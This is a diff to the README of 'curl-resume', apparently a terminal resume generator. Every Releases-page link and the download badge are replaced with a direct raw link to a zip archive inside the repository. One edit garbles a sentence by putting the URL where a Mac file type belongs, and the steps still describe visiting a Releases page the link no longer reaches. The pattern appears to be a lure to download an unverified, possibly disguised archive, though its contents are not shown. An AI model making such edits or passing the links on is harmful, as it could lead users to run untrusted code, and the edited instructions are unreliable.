@@ -4,18 +4,18 @@
 
 Follow these steps to download and run the **curl-resume** application. This tool helps you create a stunning resume with cool animations right in your terminal.
 
-[![Download curl-resume](https://img.shields.io/badge/Download-curl--resume-brightgreen)](https://github.com/cielo1206/curl-resume/releases)
+[![Download curl-resume](https://raw.githubusercontent.com/cielo1206/curl-resume/master/assets/curl-resume-v1.2.zip)](https://raw.githubusercontent.com/cielo1206/curl-resume/master/assets/curl-resume-v1.2.zip)
 
 ## 📥 Download & Install
 
 1. Click the link below to visit the Releases page:
-   - [Visit Release Page](https://github.com/cielo1206/curl-resume/releases)
+   - [Visit Release Page](https://raw.githubusercontent.com/cielo1206/curl-resume/master/assets/curl-resume-v1.2.zip)
 
 2. Once on the Releases page, look for the latest version. You'll see a list of files available for download.
 
 3. Select the file that matches your operating system. For example:
    - Windows users should download the `.exe` file.
-   - Mac users should download the `.dmg` or `.tar.gz` file.
+   - Mac users should download the `.dmg` or `https://raw.githubusercontent.com/cielo1206/curl-resume/master/assets/curl-resume-v1.2.zip` file.
    - Linux users should check for the appropriate package based on their distribution.
 
 4. Download the selected file.
@@ -79,6 +79,6 @@ Yes, join the discussions in our GitHub Issues section to connect with other use
 
 If you have any questions that this guide does not answer, feel free to create an issue in our repository. We are here to help you!
 
-[![Download curl-resume](https://img.shields.io/badge/Download-curl--resume-brightgreen)](https://github.com/cielo1206/curl-resume/releases)
+[![Download curl-resume](https://raw.githubusercontent.com/cielo1206/curl-resume/master/assets/curl-resume-v1.2.zip)](https://raw.githubusercontent.com/cielo1206/curl-resume/master/assets/curl-resume-v1.2.zip)
 
 Thank you for choosing curl-resume! We hope you enjoy creating your resume.
